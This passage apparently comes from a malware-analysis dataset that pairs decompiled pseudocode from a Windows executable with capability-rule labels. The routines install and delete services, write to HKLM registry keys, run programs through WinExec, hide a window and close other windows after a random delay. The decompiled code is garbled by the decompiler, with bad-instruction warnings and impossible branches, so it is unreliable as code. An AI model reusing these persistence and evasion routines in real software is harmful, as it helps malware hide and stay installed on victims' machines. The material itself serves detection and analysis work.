        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404cea) overlaps instruction at (ram,0x00404ce8)\n// \n\nbool fcn.00404c70(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *extraout_ECX;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t unaff_EDI;\n    char *pcVar5;\n    bool bVar6;\n    bool in_OF;\n    ulong uVar7;\n    uchar *puVar8;\n    char *var_4h;\n    \n    var_4h = NULL;\n    if ((!in_OF) && (in_OF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar7 = fcn.00404700(&var_4h);\n    if (uVar7 == 0) {\n        return false;\n    }\n    bVar6 = var_4h == NULL;\n    if (bVar6) {\n        return false;\n    }\n    pcVar4 = var_4h;\n    puVar8 = extraout_ECX;\n    if ((!bVar6) && (bVar6)) {\n        *(unaff_EDI + -0x75) = *(unaff_EDI + -0x75) - &stack0xfffffff0;\n        pcVar4 = uVar7 >> 0x20;\n        puVar8 = &stack0xfffffffc;\n    }\n    uVar3 = 0xffffffff;\n    pcVar5 = pcVar4;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4111dc, 0x41121c, 1, pcVar4, ~uVar3 - 1, puVar8);\n    return iVar2 == 0;\n}\n",
        "token_count": 473
    },
    "00404d20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "contain pusha popa sequence"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404de0) overlaps instruction at (ram,0x00404ddf)\n// \n// WARNING: Removing unreachable block (ram,0x00404e8a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __thiscall fcn.00404d20(uint32_t param_1, char *param_2)\n\n{\n    ushort *puVar1;\n    uint16_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar7;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar8;\n    char *unaff_EBX;\n    char *pcVar9;\n    uint32_t uVar10;\n    char *pcVar11;\n    uint *unaff_EDI;\n    char **ppcVar12;\n    char **ppcVar13;\n    uint *puVar14;\n    uint16_t in_ES;\n    ushort in_CS;\n    uint16_t in_SS;\n    ushort in_DS;\n    bool bVar15;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar uStack132;\n    uint uStack131;\n    uint16_t uStack32;\n    uint16_t uStack30;\n    uint16_t uStack28;\n    uint16_t uStack26;\n    uint16_t uStack24;\n    uint16_t uStack22;\n    uint16_t uStack20;\n    ushort uStack18;\n    \n    *param_2 = -3;\n    uStack20 = param_2;\n    uStack22 = uStack20;\n    uStack24 = param_1;\n    uStack18 = uStack24;\n    uStack32 = unaff_EBX;\n    param_2[1] = '\\n';\n    param_2[2] = 'H';\n    param_2[3] = '\\x0e';\n    param_2[4] = '-';\n    if ((uStack20 == uStack32) || (uStack20 != uStack32)) {\n        param_2[5] = -0x54;\n        param_2[6] = '\\b';\n        unaff_EBX = param_2;\n    }\n    puVar1 = CONCAT22(uStack20, in_SS);\n    uStack20 = 0;\n    pcVar5 = param_2 + -0x157f9f54 ^ *(param_2 + 0x75e17392);\n    uVar10 = 0x47;\n    pcVar9 = unaff_EBX + 1;\n    *puVar1 = *puVar1 | param_1;\n    *puVar1 = in_CS;\n    *pcVar5 = *pcVar5 + pcVar5;\n    pcVar6 = param_2 + 0x51;\n    cVar4 = *pcVar6;\n    cVar7 = pcVar5 >> 8;\n    *pcVar6 = *pcVar6 + cVar7;\n    if (SCARRY1(cVar4, cVar7) == *pcVar6 < '\\0') {\n        unaff_EBX[8] = '\\x1e';\n        pcVar6 = pcVar5;\n    }\n    else {\n        pcVar9 = unaff_EBX + 2;\n        pcVar6 = param_2;\n        param_2 = pcVar5;\n        uStack20 = in_DS;\n    }\n    uStack26 = pcVar6;\n    uStack24 = in_SS;\n    do {\n        uVar2 = uStack26;\n        pcVar5 = pcVar6 & 0xffff0000 | uStack26;\n        ppcVar12 = CONCAT22(uStack22, uStack24);\n        pcVar9[8] = 'M';\n        uStack28 = uStack26;\n        uStack26 = (pcVar6 & 0xffff0000) >> 0x10;\n        pcVar9[9] = -0x61;\n        uStack22 = (param_1 & 0xffff0000) >> 0x10;\n        bVar15 = false;\n        pcVar9[10] = '~';\n        while( true ) {\n            uVar3 = uVar2;\n            if ((!bVar15) && (bVar15)) {\n                cVar4 = uVar3 - *ppcVar12;\n                uStack32 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *ppcVar12) * 0x800 | (in_IF & 1) * 0x200 |\n                           (in_TF & 1) * 0x100 | (cVar4 < '\\0') * 0x80 | (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                           ((POPCOUNT(cVar4) & 1U) == 0) * 4 | uVar3 < *ppcVar12;\n                uStack30 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n                func_0x1018adb2();\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            pcVar9[0xb] = '\\x12';\n            cVar4 = uVar3 - 1;\n            bVar15 = (POPCOUNT(cVar4) & 1U) == 0;\n            pcVar9[0xc] = -0x4e;\n            if ((cVar4 != '\\0' && '\\0' < uVar3) && (cVar4 == '\\0' || uVar3 < '\\x01')) break;\n            pcVar9[0xd] = -0x12;\n            ppcVar13 = ppcVar12;\n            if (('\\0' < uVar3) && (uVar3 < '\\x01')) {\n                out(0xc4, pcVar5);\n                ppcVar13 = ppcVar12 + 1;\n                *ppcVar12 = pcVar5;\n                bVar15 = (POPCOUNT((pcVar9 >> 8) - *pcVar5) & 1U) == 0;\n            }\n            pcVar9[0xe] = 'X';\n            pcVar11 = param_2;\n            if ((bVar15) || (!bVar15)) goto code_r0x00404eac;\n            pcVar11 = *ppcVar13;\n            *ppcVar13 = param_2;\n            bVar15 = uVar10 < *(uVar10 + 0x5f9dff63);\n            uVar10 = uVar10 - *(uVar10 + 0x5f9dff63);\n            param_2 = pcVar11;\n            ppcVar12 = ppcVar13;\n            if (-1 < uVar10) {\n                if (-1 < pcVar11) {\n                    *pcVar5 = *pcVar5 + uVar3;\n                    *(uVar10 - 0x3d) = *(uVar10 - 0x3d) + pcVar9;\n                    uStack28 = uVar10;\n                    uStack26 = uVar10 >> 0x10;\n                    uStack32 = 0;\n                    uStack30 = 0;\n                    uStack132 = 0;\n                    puVar14 = &uStack131;\n                    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n                        *puVar14 = 0;\n                        puVar14 = puVar14 + 1;\n                    }\n                    *puVar14 = 0;\n                    *(puVar14 + 2) = 0;\n                    fcn.00404d20(&uStack132, &uStack32, ppcVar13, pcVar9);\n                    pcVar6 = fcn.004026e0(&uStack132, CONCAT22(uStack30, uStack32), 0x4114a8, 0x11000);\n                    *CONCAT22(uStack18, uStack20) = 0x4114a8;\n                    *unaff_EDI = 0x11000;\n                    return pcVar6;\n                }\ncode_r0x00404eac:\n                pcVar9[0xf] = 'l';\n                bVar15 = (POPCOUNT(in_ES >> 8 ^ pcVar9) & 1U) == 0;\n                iVar8 = *(uVar10 + 8);\n                *(iVar8 + 0x10) = 0x24;\n                if ((bVar15) || (!bVar15)) {\n                    *(iVar8 + 0x11) = 0x50;\n                }\n                *(pcVar5 + 0x51) = *(pcVar5 + 0x51) + iVar8 + (0xffffffbd < pcVar11);\n                *(iVar8 + 0x12) = 0x42;\n                *(iVar8 + 0x13) = 0xbe;\n                if ((uVar3 != 1) && (uVar3 == 1)) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                **(uVar10 + 0xc) = 0x14;\n                return pcVar5;\n            }\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        if ((param_1 & 0xffff0000 | in_ES) != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        pcVar6 = pcVar6 & 0xf5840000;\n        uStack24 = in_ES;\n    } while( true );\n}\n",
        "token_count": 2215
    },
    "00404f10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f10(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404d20(&var_68h, &var_4h);\n    fcn.004026e0(&var_68h, var_4h, 0x4114a8, 0x11000);\n    *arg_8h = 0x4114a8;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 244
    },
    "004012c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004012c0(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint32_t hSCManager;\n    uint8_t *puVar3;\n    int32_t extraout_ECX;\n    char in_DL;\n    uint8_t in_AF;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    uint uStack0000000c;\n    uint uVar7;\n    ushort uVar8;\n    ushort uVar9;\n    ushort uVar10;\n    ushort uVar11;\n    \n    cVar6 = SBORROW1(in_DL, 'Q');\n    cVar5 = in_DL + -0x51 < '\\0';\n    bVar4 = in_DL == 'Q';\n    uVar10 = 0x3f;\n    uVar11 = 0xf;\n    uVar8 = 0;\n    uVar9 = 0;\n    uVar7 = 0;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((bVar4 || cVar6 != cVar5) || (!bVar4 && cVar6 == cVar5)) {\n        fcn.00403760(hSCManager, arg_8h);\n        uVar7 = fcn.00401000(hSCManager, arg_8h, arg_ch);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return uVar7;\n    }\n    puVar3 = hSCManager & 0xffff0000 | (hSCManager >> 8) + (9 < (hSCManager & 0xf) | in_AF) << 8;\n    if (extraout_ECX != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puVar1 = (puVar3 | *puVar3) - 0x1c;\n    *puVar1 = *puVar1;\n    iVar2 = fcn.00405000(0, uVar7, CONCAT22(uVar9, uVar8), CONCAT22(uVar11, uVar10));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uStack0000000c = 0;\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return 1;\n}\n",
        "token_count": 523
    },
    "00402640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "contain loop",
            "start service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040268d) overlaps instruction at (ram,0x0040268b)\n// \n\nuint __cdecl fcn.00402640(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char cVar5;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    char *pcVar6;\n    uint *puVar7;\n    int32_t unaff_EDI;\n    uint8_t uVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    ulong uVar10;\n    \n    uVar10 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    pcVar6 = uVar10 >> 0x20;\n    puVar3 = uVar10;\n    uVar8 = 0;\n    bVar9 = (POPCOUNT(puVar3 & 0xff) & 1U) != 0;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    puVar7 = puVar3;\n    if ((bVar9) && (!bVar9)) {\n        puVar7 = puVar3 + 1;\n        out(*puVar3, uVar10 >> 0x20);\n        uVar8 = in_AF;\n        do {\n            cVar5 = puVar3 >> 8;\n            uVar8 = 9 < (puVar3 & 0xf) | uVar8;\n            puVar3 = CONCAT31(CONCAT21(puVar3 >> 0x10, cVar5 - uVar8), -uVar8);\n        } while (uVar8 || cVar5 == *pcVar6);\n    }\n    piVar1 = unaff_EDI + pcVar6 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar8;\n    *(extraout_ECX + 0x6a) = puVar3;\n    *pcVar6 = *pcVar6 + (extraout_ECX >> 8);\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(puVar7);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0x420)) &&\n       (iVar4 = (*pcVar2)(),  iVar4 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(puVar7);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(puVar7);\n    return 1;\n}\n",
        "token_count": 621
    },
    "00403760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403760(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 127
    },
    "004037e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403810) overlaps instruction at (ram,0x0040380e)\n// \n\nuchar * __fastcall fcn.004037e0(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    \n    if (*0x4224c0 == NULL) {\n        if ((*0x4224c0 < 0) || (*0x4224c0 >= 0)) {\n            uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n            param_2 = (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        }\n        else {\n            *param_2 = *param_2;\n            param_2 = param_2 + 0x4060f9;\n        }\n        *0x4224c0 = 0x1;\n        return param_2;\n    }\n    return *0x4224c0;\n}\n",
        "token_count": 206
    },
    "00403950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403950(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "004040b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404128) overlaps instruction at (ram,0x00404126)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004040b0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    uint8_t in_CL;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t unaff_ESI;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    float10 extraout_ST0;\n    uchar var_108h;\n    uchar *var_107h;\n    uchar *puStack260;\n    int32_t iStack256;\n    uint uStack252;\n    int32_t iStack248;\n    uchar *puStack244;\n    uint var_4h;\n    \n    puVar3 = &stack0xfffffffc;\n    if ((*0x10 != 0x10c && 0x107 < &stack0xfffffffc) &&\n       (puVar3 = &stack0xfffffffc,  *0x10 == 0x10c || SBORROW4(&stack0xfffffffc, 0x108) != &stack0xfffffef4 < 0)) {\n        puVar1 = in_EAX + -0x74c625aa;\n        *puVar1 = *puVar1 ^ in_CL;\n        puVar3 = &stack0xfffffffc;\n        arg_8h = unaff_ESI;\n        if (*puVar1 != 0) {\n            *(iStack256 + 0x458b0c4d) = *(iStack256 + 0x458b0c4d) + iStack248;\n            puVar3 = stack0xfffffef8;\n            arg_8h = _var_108h;\n        }\n    }\n    puStack244 = puVar3 + -4;\n    uStack252 = 0x4040da;\n    iStack248 = arg_8h;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (*(puVar3 + 0xc) == *(puVar3 + -4)) {\n        cVar6 = '\\0';\n        cVar5 = '\\0';\n        puVar3[-0x108] = 0;\n        puStack260 = puVar3 + -0x108;\n        puVar4 = puVar3 + -0x107;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        iStack256 = 0x104;\n        unique0x10000122 = arg_8h;\n        *(puVar4 + 2) = 0;\n        _var_108h = 0x40411d;\n        (*_sym.imp.USER32.dll_GetClassNameA)();\n        if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        _var_108h = 0x4113d8;\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar3 + -0x108);\n        if (iVar2 == 0) {\n            if ((-1 < iVar2) && (-1 >= iVar2)) {\n                *(stack0xfffffef8 + 0x1c) = extraout_ST0;\n                arg_8h = arg_8h + 5;\n            }\n            puStack260 = NULL;\n            stack0xfffffef8 = 0x404030;\n            _var_108h = arg_8h;\n            (*_sym.imp.USER32.dll_EnumChildWindows)();\n            iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n            (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n            return 0;\n        }\n        return 1;\n    }\n    return 1;\n}\n",
        "token_count": 948
    },
    "004043e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040442d) overlaps instruction at (ram,0x00404429)\n// \n\nvoid __cdecl fcn.004043e0(uint32_t arg_8h, uint *arg_ch)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    \n    puVar2 = NULL;\n    bVar3 = false;\n    bVar4 = arg_ch == NULL;\n    if (!bVar4) {\n        do {\n            if (bVar3 || bVar4) {\ncode_r0x0040442d:\n                puVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\n                if (!bVar3 && !bVar4) goto code_r0x0040442d;\n                *arg_ch = *puVar2;\n                arg_8h = arg_8h & 0xffff0000 | CONCAT11(0xdf, arg_8h);\n                puVar1 = &stack0x004060d8;\n                puVar2 = puVar2 + 1;\n                arg_ch = arg_ch + 1;\n            }\n            *(puVar2 + arg_8h) = puVar1 % 0x1a + 'a';\n            puVar2 = puVar2 + 1;\n            bVar3 = puVar2 < arg_ch;\n            bVar4 = puVar2 == arg_ch;\n        } while (bVar3);\n    }\n    return;\n}\n",
        "token_count": 331
    },
    "00404450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404450(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402e90(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00404b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00404b90(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00404f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404fdb) overlaps instruction at (ram,0x00404fd9)\n// \n\nuint fcn.00404f90(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    uVar2 = param_2;\n    uVar1 = param_1;\n    puVar5 = &param_2;\n    puVar4 = &param_1;\n    puVar3 = fcn.00401fb0(param_1, param_2, puVar4, puVar5);\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    puVar3[0x16] = param_2;\n    if ((puVar3 < 0) || (puVar3 >= 0)) {\n        puVar3 = &param_2;\n        puVar4 = &param_1;\n        puVar5 = puVar3;\n    }\n    *(puVar3 + -0x72f3ba22) = *(puVar3 + -0x72f3ba22) | param_2;\n    fcn.00401fb0(uVar1, uVar2, puVar4, puVar5);\n    return 1;\n}\n",
        "token_count": 296
    },
    "00405000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040508d) overlaps instruction at (ram,0x00405084)\n// \n\nuint __cdecl fcn.00405000(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    unkbyte6 Var3;\n    \n    Var3 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    iVar1 = Var3;\n    bVar2 = iVar1 == 0;\n    if (!bVar2) {\n        if ((!bVar2) && (bVar2)) {\n            iVar1 = 1;\n            out(pe_dos_header, Var3 >> 0x20);\n        }\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        *(iVar1 + 0x43d1773a) = *(iVar1 + 0x43d1773a) ^ 0x5627e95e;\n        (*_sym.imp.MSVCRT.dll_fclose)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 262
    },
    "00402ce0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ce0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "004046a0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004046a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x4224e0, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 140
    },
    "00401080": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401080(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4111dc, 0x411220, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    },
    "00404830": {
        "rules": [
            "get common file path",
            "contain loop",
            "contain pusha popa sequence"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a99) overlaps instruction at (ram,0x00404a95)\n// \n// WARNING: Removing unreachable block (ram,0x00404877)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00404830(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    char **ppcVar1;\n    ushort uVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint *puVar5;\n    char extraout_CL;\n    char cVar6;\n    int32_t iVar7;\n    char *extraout_ECX;\n    int32_t extraout_ECX_00;\n    char extraout_DL;\n    uint8_t extraout_DH;\n    uint8_t extraout_DH_00;\n    uint8_t uVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    int32_t *piVar12;\n    ushort in_SS;\n    uchar uVar13;\n    bool bVar14;\n    bool bVar15;\n    ulong uVar16;\n    int32_t *hSCManager;\n    uint in_stack_ffff9f71;\n    uint var_213h;\n    uchar var_110h;\n    uint var_10fh;\n    uint var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    puVar11 = &var_213h;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    *(puVar11 + 2) = 0;\n    var_110h = 0;\n    puVar11 = &var_10fh;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    var_ch = 1;\n    piVar12 = puVar11 + 3;\n    *(puVar11 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    fcn.00402390(&uStack8, &uStack12);\n    iVar7 = fcn.00402b60(param_1, param_2, param_3, param_4, uStack8, uStack12);\n    if (iVar7 == 0) {\n        return 0;\n    }\n    *0x4224b8 = fcn.00403030();\n    iVar7 = fcn.004033b0();\n    if (iVar7 == 0) {\n        return 0;\n    }\n    cVar6 = extraout_CL + -1;\n    bVar14 = (POPCOUNT(cVar6) & 1U) == 0;\n    puVar10 = &stack0xfffffffc;\n    if ((cVar6 != '\\0') && (puVar10 = &stack0xfffffffc,  cVar6 == '\\0')) {\n        puVar9 = &stack0xfffffdd0;\n        puVar10 = &stack0xfffffdd0;\n        cVar6 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar5;\n            cVar6 = cVar6 + -1;\n        } while ('\\0' < cVar6);\n    }\n    uVar2 = fcn.00404c70();\n    if ((!bVar14) && (bVar14)) {\n        param_1 = 0x34a96cf4;\n        puVar10 = *0x6817b43a;\n        uVar13 = in(uVar2);\n        *piVar12 = uVar13;\n        *extraout_ECX = *extraout_ECX + extraout_DL + '\\x01';\n        piVar12 = puVar11 + 1;\n    }\n    iVar7 = fcn.004031e0(in_stack_ffff9f71);\n    if (iVar7 == -1) {\n        iVar7 = fcn.004031e0(0x411060);\n        if (iVar7 == -1) goto code_r0x00404a1a;\n        piVar12 = 0xf;\n    }\n    else {\n        piVar12 = 0xe;\n    }\n    iVar7 = fcn.00404450(param_1);\n    if (iVar7 != 0) {\n        fcn.00401080(piVar12);\n        fcn.00403870(piVar12);\n        return 1;\n    }\n    if (*0x4224b8 == 0) {\n        return 0;\n    }\ncode_r0x00404a1a:\n    uVar16 = fcn.004012c0(param_1, puVar10 + -0x110);\n    uVar3 = uVar16 >> 0x20;\n    if (uVar16 == 0) {\n        *(puVar10 + -0xc) = 0;\n    }\n    if (*(puVar10 + -0xc) != 0) {\n        uVar16 = fcn.00404b30(param_1);\n        uVar3 = uVar16 >> 0x20;\n        if (uVar16 == 0) {\n            *(puVar10 + -0xc) = 0;\n        }\n    }\n    while( true ) {\n        uVar8 = uVar3 >> 8;\n        if (*(puVar10 + -0xc) == 0) {\n            uVar3 = fcn.00402e90(param_1, 0);\n            *(puVar10 + -0xc) = uVar3;\n            uVar8 = extraout_DH;\n        }\n        if (*(puVar10 + -0xc) != 0) {\n            fcn.00403870(0xffffffff);\n            uVar8 = extraout_DH_00;\n        }\n        bVar14 = uVar8 < 0x36;\n        bVar15 = (POPCOUNT(uVar8 - 0x36) & 1U) == 0;\n        uVar3 = 1000;\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        if ((bVar15) || (!bVar15)) goto code_r0x00404b12;\n        ppcVar1 = segment(in_SS, *0x10 + -0x608f);\n        pcVar4 = *ppcVar1;\n        uVar3 = 0xb7bc9ea5;\n        if (bVar14) break;\n        if (!bVar15) {\n            uVar3 = 0xb7bc9ea5;\ncode_r0x00404b12:\n            (*_sym.imp.KERNEL32.dll_WinExec)(0x411080, 0, uVar3);\n            return *(puVar10 + -0xc);\n        }\n        *pcVar4 = *pcVar4 + pcVar4;\n    }\n    uVar13 = param_2 >> 8 < 0x9e;\n    cVar6 = piVar12 == 1;\n    hSCManager = piVar12;\n    do {\n        puVar5 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f, hSCManager, param_1, param_2);\n        if ((uVar13) || (!uVar13)) break;\n    } while (extraout_ECX_00 != 1 && cVar6 != '\\0');\n    uVar3 = *puVar5;\n    *piVar12 = puVar5 + 1;\n    *(*0x9750e2b5 + 0x56) = *(*0x9750e2b5 + 0x56) | uVar3 >> 0x1f;\n    uVar3 = 